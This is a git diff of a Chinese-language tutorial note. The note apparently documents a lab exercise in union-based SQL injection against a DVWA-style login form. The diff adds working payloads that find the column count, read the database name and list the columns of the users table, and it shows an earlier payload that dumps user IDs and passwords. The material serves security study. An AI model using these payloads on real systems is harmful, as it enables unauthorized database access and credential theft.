@@ -47,7 +47,16 @@ if(isset( $_REQUEST['Submit'])){
 
 井字號代表註釋掉後面語法，order by 列位數
 ![alt text](image-2.png)
-當order by 3 時會報錯，代表有兩列可控
+
+當order by 3 時會報錯，代表有兩列可控，只要知道這個訊息，就可以進行union 查詢
+```
+    1' union  select 1,2#  因為有兩列，所以後面的select 要放兩個column name 
+```
+
+取得database 名稱
+```
+    1' union select 1, database()#
+```
 
 獲取table 全部表名稱
 
@@ -58,7 +67,7 @@ if(isset( $_REQUEST['Submit'])){
 可以得知table 總共有guestbook、users這兩張表
 獲取table欄位名稱
 
-    1' or 1 = 1 union select group_concat(user_id),group_concat(password) from users #
+     1' or 1 = 1 union select 1,group_concat(column_name) from information_schema.columns  where table_name = 'users' #
 
 ![alt text](image-4.png)
 
